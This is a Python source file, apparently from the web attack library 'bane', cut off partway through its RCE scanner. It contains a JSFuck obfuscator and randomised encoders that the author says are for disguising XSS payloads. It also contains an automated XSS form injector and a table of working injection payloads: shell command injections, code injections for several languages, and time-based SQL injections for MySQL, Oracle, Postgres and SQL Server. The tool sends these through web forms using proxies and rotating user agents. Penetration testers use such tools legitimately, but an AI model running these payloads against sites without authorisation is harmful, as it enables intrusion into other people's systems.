#coding: utf-8
import subprocess,os,xtelnet,sys,cgi,re
from colorama import Fore, Back, Style
if  sys.version_info < (3,0):
 if (sys.platform.lower() == "win32") or( sys.platform.lower() == "win64"):
  Fore.WHITE=''
  Fore.GREEN=''
  Fore.RED=''
  Fore.YELLOW=''
  Fore.BLUE=''
  Fore.MAGENTA=''
  Style.RESET_ALL=''
 import urllib,HTMLParser
 from urlparse import urlparse
else:
 from urllib.parse import urlparse
 import urllib.parse as urllib
 import html.parser as HTMLParser
import requests,socket,random,time,ssl
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import bs4
from bs4 import BeautifulSoup
from bane.payloads import *
from bane.pager import inputs,forms,crawl

def random_string(size):
 s=""
 for x in range(size):
     s+=random.choice(lis)
 return s
 
#why did i remove the SQL-Is part? well compared to other scanning functions they are immature. Besides SQLMap is a better option to test against SQL-Is :)


#P.S: I didn't write the following class but i find it very useful to encode XSS payloads

class js_fuck(object):
    '''
    Encodes/Decodes Javascript using JSFuck 0.4.0
    (https://github.com/aemkei/jsfuck)

    Class variables:
    USE_CHAR_CODE   -- string used to indicate which keys in MAPPING will
                                           be encoded using their ASCII character code

    MIN                            -- int the position within MAPPING dictionary to start
                                          iterating from, for the final encoding pass

    MAX                          -- int the maximum value to iterate in MAPPING
                                         on the final encode

    SIMPLE                    -- dictionary of built-in Javascript types and values

    CONSTRUCTORS   -- dictionary of mostly Javascript data types

    MAPPING                -- dictionary of every character to be mapped and decoded

    GLOBAL                  -- string used to replace 'GLOBAL' value on final encode

    '''

    USE_CHAR_CODE = "USE_CHAR_CODE"

    MIN, MAX = 32, 126

    SIMPLE = {
        'false':      '![]',
        'true':       '!![]',
        'undefined':  '[][[]]',
        'NaN':        '+[![]]',
        'Infinity':   ('+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+'
                       '!+[]]+[+[]]+[+[]]+[+[]])')  # +"1e1000"
    }

    CONSTRUCTORS = {
        'Array':    '[]',
        'Number':   '(+[])',
        'String':   '([]+[])',
        'Boolean':  '(![])',
        'Function': '[]["fill"]',
        'RegExp':   'Function("return/"+false+"/")()'
    }

    MAPPING = {
        'a':   '(false+"")[1]',
        'b':   '([]["entries"]()+"")[2]',
        'c':   '([]["fill"]+"")[3]',
        'd':   '(undefined+"")[2]',
        'e':   '(true+"")[3]',
        'f':   '(false+"")[0]',
        'g':   '(false+[0]+String)[20]',
        'h':   '(+(101))["to"+String["name"]](21)[1]',
        'i':   '([false]+undefined)[10]',
        'j':   '([]["entries"]()+"")[3]',
        'k':   '(+(20))["to"+String["name"]](21)',
        'l':   '(false+"")[2]',
        'm':   '(Number+"")[11]',
        'n':   '(undefined+"")[1]',
        'o':   '(true+[]["fill"])[10]',
        'p':   '(+(211))["to"+String["name"]](31)[1]',
        'q':   '(+(212))["to"+String["name"]](31)[1]',
        'r':   '(true+"")[1]',
        's':   '(false+"")[3]',
        't':   '(true+"")[0]',
        'u':   '(undefined+"")[0]',
        'v':   '(+(31))["to"+String["name"]](32)',
        'w':   '(+(32))["to"+String["name"]](33)',
        'x':   '(+(101))["to"+String["name"]](34)[1]',
        'y':   '(NaN+[Infinity])[10]',
        'z':   '(+(35))["to"+String["name"]](36)',

        'A':   '(+[]+Array)[10]',
        'B':   '(+[]+Boolean)[10]',
        'C':   'Function("return escape")()(("")["italics"]())[2]',
        'D':   'Function("return escape")()([]["fill"])["slice"]("-1")',
        'E':   '(RegExp+"")[12]',
        'F':   '(+[]+Function)[10]',
        'G':   '(false+Function("return Date")()())[30]',
        'H':   USE_CHAR_CODE,
        'I':   '(Infinity+"")[0]',
        'J':   USE_CHAR_CODE,
        'K':   USE_CHAR_CODE,
        'L':   USE_CHAR_CODE,
        'M':   '(true+Function("return Date")()())[30]',
        'N':   '(NaN+"")[0]',
        'O':   '(NaN+Function("return{}")())[11]',
        'P':   USE_CHAR_CODE,
        'Q':   USE_CHAR_CODE,
        'R':   '(+[]+RegExp)[10]',
        'S':   '(+[]+String)[10]',
        'T':   '(NaN+Function("return Date")()())[30]',
        'U':   ('(NaN+Function("return{}")()["to"+String'
                '["name"]]["call"]())[11]'),
        'V':   USE_CHAR_CODE,
        'W':   USE_CHAR_CODE,
        'X':   USE_CHAR_CODE,
        'Y':   USE_CHAR_CODE,
        'Z':   USE_CHAR_CODE,

        ' ':   '(NaN+[]["fill"])[11]',
        '!':   USE_CHAR_CODE,
        '"':   '("")["fontcolor"]()[12]',
        '#':   USE_CHAR_CODE,
        '$':   USE_CHAR_CODE,
        '%':   'Function("return escape")()([]["fill"])[21]',
        '&':   '("")["link"](0+")[10]',
        '\'':  USE_CHAR_CODE,
        '(':   '(undefined+[]["fill"])[22]',
        ')':   '([0]+false+[]["fill"])[20]',
        '*':   USE_CHAR_CODE,
        '+':   ('(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]'
                '+[+!+[]]+[+[]]+[+[]])+[])[2]'),
        ',':   '([]["slice"]["call"](false+"")+"")[1]',
        '-':   '(+(.+[0000000001])+"")[2]',
        '.':   ('(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+'
                '[]+!+[]]+[+[]])+[])[+!+[]]'),
        '/':   '(false+[0])["italics"]()[10]',
        ':':   '(RegExp()+"")[3]',
        ';':   '("")["link"](")[14]',
        '<':   '("")["italics"]()[0]',
        '=':   '("")["fontcolor"]()[11]',
        '>':   '("")["italics"]()[2]',
        '?':   '(RegExp()+"")[2]',
        '@':   USE_CHAR_CODE,
        '[':   '([]["entries"]()+"")[0]',
        '\\':  USE_CHAR_CODE,
        ']':   '([]["entries"]()+"")[22]',
        '^':   USE_CHAR_CODE,
        '_':   USE_CHAR_CODE,
        '`':   USE_CHAR_CODE,
        '{':   '(true+[]["fill"])[20]',
        '|':   USE_CHAR_CODE,
        '}':   '([]["fill"]+"")["slice"]("-1")',
        '~':   USE_CHAR_CODE
    }

    GLOBAL = 'Function("return this")()'

    def __init__(self, js=None):
        '''
        Checks if passed some Javascript and if so assigns an instance variable
        to that of the pass Javascript.

        Populates MAPPING dictionary with the keys corresponding encoded value.

        Keyword arguments:
        js -- string containing the encoded Javascript to be
              decoded (defualt None)

        '''
        if js:
            self.js = js

        self.__fillMissingDigits()
        self.__fillMissingChars()
        self.__replaceMap()
        self.__replaceStrings()

    def decode(self, js=None):
        '''
        Decodes JSFuck'd Javascript

        Keyword arguments:
        js -- string containing the JSFuck to be decoded (defualt None)

        Returns:
        js -- string of decoded Javascript

        '''
        if not js:
            js = self.js

        js = self.__mapping(js)

        # removes concatenation operators
        js = re.sub('\+(?!\+)', '', js)
        js = js.replace('++', '+')

        # check to see if source js is eval'd
        if '[][fill][constructor]' in js:
            js = self.uneval(js)

        self.js = js

        return js

    def encode(self, js=None, wrapWithEval=False, runInParentScope=False):
        '''
        Encodes vanilla Javascript to JSFuck obfuscated Javascript

        Keyword arguments:
        js                            -- string of unobfuscated Javascript

        wrapWithEval        -- boolean determines whether to wrap with an eval

        runInParentScope -- boolean determines whether to run in parents scope

        '''
        output = []

        if not js:
            js = self.js

            if not js:
                return ''

        regex = ''

        for i in self.SIMPLE:
            regex += i + '|'

        regex += '.'

        def inputReplacer(c):
            c = c.group()
            replacement = self.SIMPLE[c] if c in self.SIMPLE else False

            if replacement:
                output.append('[' + replacement + ']+[]')

            else:
                replacement = self.MAPPING[c] if c in self.MAPPING else False

                if replacement:
                    output.append(replacement)
                else:
                    replacement = (
                        '([]+[])[' + self.encode('constructor') + ']'
                        '[' + self.encode('fromCharCode') + ']'
                        '(' + self.encode(str(ord(c[0]))) + ')')

                    output.append(replacement)
                    self.MAPPING[c] = replacement

        re.sub(regex, inputReplacer, js)

        output = '+'.join(output)

        if re.search(r'^\d$', js):
            output += "+[]"

        if wrapWithEval:
            if runInParentScope:
                output = ('[][' + self.encode('fill') + ']'
                          '[' + self.encode('constructor') + ']'
                          '(' + self.encode('return eval') + ')()'
                          '(' + output + ')')

            else:
                output = ('[][' + self.encode('fill') + ']'
                          '[' + self.encode('constructor') + ']'
                          '(' + output + ')')

        self.js = output

        return output

    def uneval(self, js):
        '''
        Unevals a piece of Javascript wrapped with an encoded eval

        Keyword arguments:
        js -- string containing an eval wrapped string of Javascript

        Returns:
        js -- string with eval removed

        '''
        js = js.replace('[][fill][constructor](', '')
        js = js[:-2]

        ev = 'return eval)()('

        if ev in js:
            js = js[(js.find(ev) + len(ev)):]

        return js

    def __mapping(self, js):
        '''
        Iterates over MAPPING and replaces every value found with
        its corresponding key

        Keyword arguments:
        js -- string containing Javascript encoded with JSFuck

        Returns:
        js -- string of decoded Javascript

        '''
        for key, value in sorted(
                self.MAPPING.items(), key=lambda x: len(x[1]), reverse=True):
            js = js.replace(value, key)

        return js

    def __fillMissingDigits(self):
        '''
        Calculates 0-9's encoded value and adds it to MAPPING

        '''
        for number in xrange(10):
            output = '+[]'

            if number > 0:
                output = '+!' + output

            for i in xrange(number - 1):
                output = '+!+[]' + output

            if number > 1:
                output = output[1:]

            self.MAPPING[str(number)] = '[' + output + ']'

    def __fillMissingChars(self):
        '''
        Iterates over MAPPING and fills missing character values with a string
        containing their ascii value represented in hex

        '''
        for key in self.MAPPING:
            if self.MAPPING[key] == self.USE_CHAR_CODE:
                hexidec = hex(ord(key[0]))[2:]

                digit_search = re.findall(r'\d+', hexidec)
                letter_search = re.findall(r'[^\d+]', hexidec)

                digit = digit_search[0] if digit_search else ''
                letter = letter_search[0] if letter_search else ''

                string = ('Function("return unescape")()("%%"+(%s)+"%s")'
                          % (digit, letter))

                self.MAPPING[key] = string

    def __replaceMap(self):
        '''
        Iterates over MAPPING from MIN to MAX and replaces value with values
        found in CONSTRUCTORS and SIMPLE, as well as using digitalReplacer and
        numberReplacer to replace numeric values

        '''
        def replace(pattern, replacement):
            return re.sub(pattern, replacement, value, flags=re.I)

        def digitReplacer(x):
            return self.MAPPING[x.group(1)]

        def numberReplacer(y):
            values = list(y.group(1))
            head = int(values[0])
            output = '+[]'

            values.pop(0)

            if head > 0:
                output = '+!' + output

            for i in xrange(1, head):
                output = '+!+[]' + output

            if head > 1:
                output = output[1:]

            return re.sub(r'(\d)', digitReplacer, '+'.join([output] + values))

        for i in xrange(self.MIN, self.MAX + 1):
            character = chr(i)
            value = self.MAPPING[character]

            original = ''

            if not value:
                continue

            while value != original:
                original = value

                for key, val in self.CONSTRUCTORS.iteritems():
                    value = replace(r'\b' + key, val + '["constructor"]')

                for key, val in self.SIMPLE.iteritems():
                    value = replace(key, val)

            value = replace(r'(\d\d+)', numberReplacer)
            value = replace(r'\((\d)\)', digitReplacer)
            value = replace(r'\[(\d)\]', digitReplacer)

            value = replace(r'GLOBAL', self.GLOBAL)
            value = replace(r'\+""', '+[]')
            value = replace(r'""', '[]+[]')

            self.MAPPING[character] = value

    def __replaceStrings(self):
        '''
        Replaces strings added in __replaceMap with there encoded values

        '''
        regex = r'[^\[\]\(\)\!\+]'

        # determines if there are still characters to replace
        def findMissing():
            done = False
            # python 2 workaround for nonlocal
            findMissing.missing = {}

            for key, value in self.MAPPING.iteritems():
                if re.findall(regex, value):
                    findMissing.missing[key] = value
                    done = True

            return done

        def mappingReplacer(x):
            return '+'.join(list(x.group(1)))

        def valueReplacer(x):
            x = x.group()
            return x if x in findMissing.missing else self.MAPPING[x]

        for key in self.MAPPING:
            self.MAPPING[key] = re.sub(r'\"([^\"]+)\"', mappingReplacer,
                                       self.MAPPING[key], flags=re.I)

        while findMissing():
            for key in findMissing.missing:
                value = self.MAPPING[key]
                value = re.sub(regex, valueReplacer, value)

                self.MAPPING[key] = value
                findMissing.missing[key] = value


def jsfuck_encoder(text,parent=True,eval=True):
 return js_fuck().encode(text,eval,parent)


def find_xss_context(text,payload):
 try:
  a=re.search('<(.*?)=?{}?(.*?)>'.format(re.escape(r'{}'.format(payload))), text).group(0)
  b=a.replace(payload,'')
  if len(re.findall('<(.*?)>',b))!=1:
   return payload
  else:
   return a
 except:
  return payload
  
  
def html_decoder(payload,html_encode_level=0):
 for x in range(html_encode_level):
  payload=HTMLParser.HTMLParser().unescape(payload)
 return payload

def html_encoder(text,random_level=1):
 if random_level==1:
  d=''
  for c in text:
   a=random.randint(0,1)
   if a==0:
    d+=c
   else:
    d+='&#'+str(ord(c))
  return d
 if random_level==2:
  return ''.join('&#%d' % ord(c) for c in text)
 else:
  return text

def hexadecimal_encoder(text,random_level=1):
 """
 only for js functions names
 """
 if random_level==1:
  d=''
  for c in text:
   a=random.randint(0,1)
   if a==0:
    d+=c
   else:
    d+=hex(ord(c)).replace('0x',r'\u00')
  return d
 if random_level==2:
  return ''.join(hex(ord(c)).replace('0x',r'\u00') for c in text)
 else:
  return unicode(text)

def html_hexadecimal_encoder(text,random_level=1):
 if random_level==1:
  d=''
  for c in text:
   a=random.randint(0,1)
   if a==0:
    d+=c
   else:
    d+=hex(ord(c)).replace('0x','&#x')
  return d
 if random_level==2:
  return ''.join(hex(ord(c)).replace('0x','&#x') for c in text)
 else:
  return unicode(text)

def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
  '''
   this function is for xss test with GET requests.

  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  for i in d:
   if (d[i]=="") and (fill_empty>0):
    st=""
    for j in range(fill_empty):
     st+=random.choice(lis)
    d[i]=st
  for i in d:
   if i in leave_empty:
    d[i]=""
  if debug==True:
   for x in d:
    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
  try:
     c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
     if  xp in c:
      return (True,find_xss_context(c,xp))
  except Exception as e:
   pass
  return (False,'')
def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
  '''
   this function is for xss test with POST requests.
  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  for i in d:
   if (d[i]=="") and (fill_empty>0):
    st=""
    for j in range(fill_empty):
     st+=random.choice(lis)
    d[i]=st
  for i in d:
   if i in leave_empty:
    d[i]=""
  if debug==True:
   for x in d:
    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
  try:
     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
     if xp in c:
      return (True,find_xss_context(c,xp))
  except Exception as e:
   pass
  return (False,'')
def xss(u,payload=None,show_warnings=True,target_form_action=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,proxy=None,ignored_values=["anonymous user","..."],proxies=None,timeout=10,user_agent=None,cookie=None,debug=False,leave_empty=[]):
  '''
   this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

   usage:
  
   >>>import bane
   >>>bane.xss('http://www.example.com/")

   >>>bane.xss('http://www.example.com/',payload="<script>alert(123);</script>")
   
  '''
  target_page=u
  if proxy:
   proxy=proxy
  if proxies:
   proxy=random.choice(proxies)
  dic={}
  pre_apyload=True
  if payload:
   xp_f=payload
   pre_apyload=False
  else:
   xp_f='<sCrIpT {}>{}(`vulnerable`)</ScRiPt {}>'
  if logs==True:
   print(Fore.WHITE+"[~]Getting forms..."+Style.RESET_ALL)
  hu=True
  fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
  if len(fom)==0:
   if logs==True:
    print(Fore.RED+"[-]No forms were found!!!"+Style.RESET_ALL)
   hu=False
  if hu==True:
   if target_form_action:
    i=0
    for x in fom:
     if x["action"]==target_form_action:
       i=fom.index(x)
    fom=fom[i:i+1]
   form_index=-1
   for l1 in fom:
    if pre_apyload==True:
     xp=xp_f.format(random_string(random.randint(1,7)),hexadecimal_encoder('alert'),random_string(random.randint(1,7)))
    else:
     xp=xp_f
    if target_form_action:
     form_index=0
    else:
     form_index+=1
    lst={}
    vul=[]
    sec=[]
    hu=True
    u=l1['action']
    if l1['method']=='post':
     post=True
     get=False
    else:
     post=False
     get=True
    if logs==True:
      print(Fore.BLUE+"Form: "+Fore.WHITE+str(form_index)+Fore.BLUE+"\nAction: "+Fore.WHITE+u+Fore.BLUE+"\nMethod: "+Fore.WHITE+l1['method']+Fore.BLUE+"\nPayload: "+Fore.WHITE+xp+Style.RESET_ALL)
    """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     hu=False
     if logs==True:
      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
    if True:
     extr=[]
     l=[]
     for x in l1['inputs']:
      if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):#some websites may introduce in the input certain value that can be replaced ( because the function works only on empty inputs ) , all you have to do is put something which specify it among the others to be ingnored and inject our xss payload there !!
       extr.append(x)
      else:
       l.append(x)
     for x in extr:
      if x.split(':')[0] in l:
       extr.remove(x)
     #if '?' in u:
      #u=u.split('?')[0]
     if len(l)==0:
      print(Fore.RED+"[-]No empty fields to test on !!"+Style.RESET_ALL)
      if show_warnings==True: 
       print(Fore.WHITE+'\n\nYou can use "ignored_values" parameter to pass the keywords which can be ignored if has been found in an input:\n\nbane.xss(url,ignored_values=["...","search"]\n\nSo if that keyword was found in an input, it will be replaced by our payload.\n\nForm\'s fielda and values (seperated by ":")\n'+Style.RESET_ALL)      
       for x in extr:
        print(x)
        print("\n")
     for i in l:
      user=None
      i=i.split(':')[0]
      try:
       if proxies:
        proxy=random.choice(proxies)
       pl={i : xp}
       extra={}
       if len(extr)!=0:
        for x in extr:
         a=x.split(':')[0]
         b=x.split(':')[1]
         extra.update({a:b})
       if get==True: 
        if fresh==True:
         extr=[]
         user=random.choice(ua)
         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
         if target_form_action:
          j=0
          for x in k:
           if x["action"]==target_form_action:
            j=k.index(x)
          k=k[j:j+1]
         for x in k[form_index]['inputs']:
          try:
           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
            extr.append(x)
          except:
            pass
         for x in extr:
          if x.split(':')[0] in l:
           extr.remove(x)
         extra={}
         if len(extr)!=0:
          for x in extr:
           a=x.split(':')[0]
           b=x.split(':')[1]
           extra.update({a:b})
        for lop in l:
         if lop!=i:
          extra.update({lop.split(':')[0]:lop.split(':')[1]})
        if ignore_values==True:
         for x in extra:
          extra[x]=""
        xss_res=xss_get(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
        if xss_res[0]==True:
          x="parameter: '"+i+"' => [+]Payload was found"
          vul.append((i,xss_res[1]))
          colr=Fore.GREEN
        else:
         x="parameter: '"+i+"' => [-]Payload was not found"
         sec.append(i)
         colr=Fore.RED
        if logs==True:
         print (colr+x+Style.RESET_ALL)
       if post==True:
        if fresh==True:
         extr=[]
         user=random.choice(ua)
         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
         if target_form_action:
          j=0
          for x in k:
           if x["action"]==target_form_action:
            j=k.index(x)
          k=k[j:j+1]
         for x in k[form_index]['inputs']:
          try:
           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
            extr.append(x)
          except:
           pass
         for x in extr:
          if x.split(':')[0] in l:
           extr.remove(x)
         extra={}
         if len(extr)!=0:
          for x in extr:
           a=x.split(':')[0]
           b=x.split(':')[1]
           extra.update({a:b})
        for lop in l:
         if lop!=i:
          extra.update({lop.split(':')[0]:lop.split(':')[1]})
        if ignore_values==True:
         for x in extra:
          extra[x]=""
        xss_res=xss_post(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug,fill_empty=fill_empty,leave_empty=leave_empty)
        if xss_res[0]==True:
         x="parameter: '"+i+"' => [+]Payload was found"
         vul.append((i,xss_res[1]))
         colr=Fore.GREEN
        else:
         x="parameter: '"+i+"' =>  [-]Payload was not found"
         sec.append(i)
         colr=Fore.RED
        #lst.update(reslt)
        if logs==True:
         print (colr+x+Style.RESET_ALL)
      except Exception as ex:
       pass
       break
    dic.update({form_index:{"Form":u,"Method":l1['method'],"Passed":vul,"Failed":sec}}) 
   return {"Payload":xp,"Page":target_page,"Output":dic}

def exec_get(u,pl,delay=10,file_name="",based_on="time",user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
  '''
   this function is for rce test with GET requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the rce payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  ran=random_string(random.randint(3,10))
  for x in pl:
   pl[x]=pl[x].format(ran)
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  for i in d:
   if (d[i]=="") and (fill_empty>0):
    st=""
    for j in range(fill_empty):
     st+=random.choice(lis)
    d[i]=st
  for i in d:
   if i in leave_empty:
    d[i]=""
  if debug==True:
   for x in d:
    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
  try:
     if based_on[0]=="time":
      t=time.time()
     c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
     if based_on[0]=="file":
      c=requests.get(u.replace(u.split("/")[-1],based_on[1]+".txt"), params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False)
      if ((c.status_code==200)and (len(c.text)==0)):
        return (True, u.replace(u.split("/")[-1],based_on[1])+".txt")
     if based_on[0]=="time":
      if int(time.time()-t)>=based_on[1]:
       return (True,'')
  except Exception as e:
   pass
  return (False,'')

def exec_post(u,pl,delay=10,file_name="",based_on=("time",10),user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False,fill_empty=0,leave_empty=[]):
  '''
   this function is for rce test with POST requests.

   it takes the 4 arguments:
   
   u: link to test
   pl: dictionary contains the paramter and the rce payload
   extra: if the request needs additionnal parameters you can add them there in dictionary format {param : value}
   timeout: timeout flag for the request

  '''
  if user_agent:
   us=user_agent
  else:
   us=random.choice(ua)
  if cookie:
    hea={'User-Agent': us,'Cookie':cookie}
  else:
   hea={'User-Agent': us}
  if proxy:
   proxy={'http':'http://'+proxy}
  for x in pl:
   xp=pl[x]
  d={}
  if extra:
   d.update(extra)
  d.update(pl)
  for i in d:
   if (d[i]=="") and (fill_empty>0):
    st=""
    for j in range(fill_empty):
     st+=random.choice(lis)
    d[i]=st
  for i in d:
   if i in leave_empty:
    d[i]=""
  if debug==True:
   for x in d:
    print("{}{} : {}{}".format(Fore.MAGENTA,x,Fore.WHITE,d[x]))
  try:
     if based_on[0]=="time":
      t=time.time()
     c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
     if based_on[0]=="file":
      c=requests.get(u.replace(u.split("/")[-1],based_on[1]+".txt"), params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False)
      if ((c.status_code==200)and (len(c.text)==0)):
        return (True, u.replace(u.split("/")[-1],based_on[1])+".txt")
     if based_on[0]=="time":
      if int(time.time()-t)>=based_on[1]:
       return (True,'')
  except Exception as e:
   pass
  return (False,'')
  
def rce(u,payload_index=0,injection={"command":"linux"},quote="",based_on="time",delay=10,target_os="linux",show_warnings=True,target_form_action=None,ignore_values=False,fresh=True,logs=True,fill_empty=10,proxy=None,ignored_values=["anonymous user","..."],proxies=None,timeout=40,user_agent=None,cookie=None,debug=False,leave_empty=[]):
  '''
   this function is for RCE test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.

   usage:
  
   >>>import bane
   >>>bane.rce('http://www.example.com/")

  '''
  payloads={
            "command":
                      {
                       "linux":
                               {
                                "file":
                                       [" |touch {}.txt&"," &touch {}.txt&",";touch {}.txt;","`touch {}.txt`","$(touch {}.txt)"],
                                "time":                            
                                       [" |sleep {}&"," &sleep {}&",";sleep {};","`sleep {}`","$(sleep {})"]
                                },
                       "windows":
                                {
                                 "file":
                                        [" |copy nul {}.txt&"," &copy nul {}.txt &"],
                                 "time":
                                        [" |ping -n {} 127.0.0.1&"," &ping -n {} 127.0.0.1 &"]
                                }
                       },
            "code":
                   {
                    "python":
                             {
                             "file":
                                    [" open('{}.txt', 'w') "],
                             "time":
                                    [" __import__('time').sleep({}) "]
                             },
                    "php":
                          {
                           "file":
                                  [" file_put_contents('{}.txt', '') "],
                           "time":
                                  [" sleep({}) "]
                          },
                    "ruby":
                           {
                            "file":
                                   [' File.new("{}.txt", "w") '],
                            "time":
                                   [" sleep({}) "]
                           },
                    "perl":
                           {
                            "file":
                                   [' open (fh, ">", "{}.txt") '],
                            "time":
                                   [" sleep({}) "]
                           },
                    "nodejs":
                             {
                              "file":
                                     [" require('fs').createWriteStream('{}.txt', {flags: 'w'})  "],
                              "time":
                                     [" (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) "," await (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) "]
                             }
                    },
            "sql":
                  {
                   "mysql":
                           {
                            "time":
                                   ["'-sleep({})  -- hi",'"-sleep({})  -- hi',"-sleep({})  -- hi"]
                           },
                   "oracle":
                            {
                             "time":
                                    ["'-dbms_lock.sleep({})  -- hi",'"-dbms_lock.sleep({})  -- hi',"-dbms_lock.sleep({})  -- hi"]
                            },
                   "postgre":
                             {
                              "time":
                                     ["'-pg_sleep({})   -- hi",'"-pg_sleep({})  -- hi',"-pg_sleep({})  -- hi"]
                             },
                   "sql_server":
                                {
                                 "time":
                                        ["'-WAITFOR DELAY '00:00:{}'  -- hi","-WAITFOR DELAY '00:00:{}'  -- hi"]
                                }
                  }              
  }
  xp=""
  based_on_o=based_on
  if quote:
   xp+=quote
  inject_type=list(injection.keys())[0]
  inject_target=injection[inject_type]
  xp+=payloads[inject_type.lower()][inject_target.lower()][based_on.lower()][payload_index]
  target_page=u
  if proxy:
   proxy=proxy
  if proxies:
   proxy=random.choice(proxies)
  dic={}
  if logs==True:
   print(Fore.WHITE+"[~]Getting forms..."+Style.RESET_ALL)
  hu=True
  fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
  if len(fom)==0:
   if logs==True:
    print(Fore.RED+"[-]No forms were found!!!"+Style.RESET_ALL)
   hu=False
  if hu==True:
   if target_form_action:
    i=0
    for x in fom:
     if x["action"]==target_form_action:
       i=fom.index(x)
    fom=fom[i:i+1]
   form_index=-1
   for l1 in fom:
    if target_form_action:
     form_index=0
    else:
     form_index+=1
    if based_on_o.lower()=="file":
     based_on=("file",random_string(random.randint(3,10)))
    else:
     based_on=("time",int(delay))
    xp=xp.format(based_on[1])
    lst={}
    vul=[]
    sec=[]
    u=l1['action']
    if l1['method']=='post':
     post=True
     get=False
    else:
     post=False
     get=True
    if logs==True:
      print(Fore.BLUE+"Form: "+Fore.WHITE+str(form_index)+Fore.BLUE+"\nAction: "+Fore.WHITE+u+Fore.BLUE+"\nMethod: "+Fore.WHITE+l1['method']+Fore.BLUE+"\nPayload: "+Fore.WHITE+xp+Style.RESET_ALL)
    """if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))==0:
     if logs==True:
      print(Fore.YELLOW+"[-]No parameters found on that page !! Moving on.."+Style.RESET_ALL)"""
    if True:#else:
     extr=[]
     l=[]
     for x in l1['inputs']:
      if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):#some websites may introduce in the input certain value that can be replaced ( because the function works only on empty inputs ) , all you have to do is put something which specify it among the others to be ingnored and inject our rce payload there !!
       extr.append(x)
      else:
       l.append(x)
     for x in extr:
      if x.split(':')[0] in l:
       extr.remove(x)
     #if '?' in u:
      #u=u.split('?')[0]
     if len(l)==0:
      print(Fore.RED+"[-]No empty fields to test on !!"+Style.RESET_ALL)
      if show_warnings==True: 
       print(Fore.WHITE+'\n\nYou can use "ignored_values" parameter to pass the keywords which can be ignored if has been found in an input:\n\nbane.rce(url,ignored_values=["...","search"]\n\nSo if that keyword was found in an input, it will be replaced by our payload.\n\nForm\'s fielda and values (seperated by ":")\n'+Style.RESET_ALL)      
       for x in extr:
        print(x)
        print("\n")
     for i in l:
      user=None
      i=i.split(':')[0]
      try:
       if proxies:
        proxy=random.choice(proxies)
       pl={i : xp.format(based_on[1])}
       extra={}
       if len(extr)!=0:
        for x in extr:
         a=x.split(':')[0]
         b=x.split(':')[1]
         extra.update({a:b})
       if get==True: 
        if fresh==True:
         extr=[]
         user=random.choice(ua)
         k=forms(target_page,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
         if target_form_action:
          j=0
          for x in k:
           if x["action"]==target_form_action:
            j=k.index(x)
          k=k[j:j+1]
         for x in k[form_index]['inputs']:
          try:
           if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in ignored_values))):
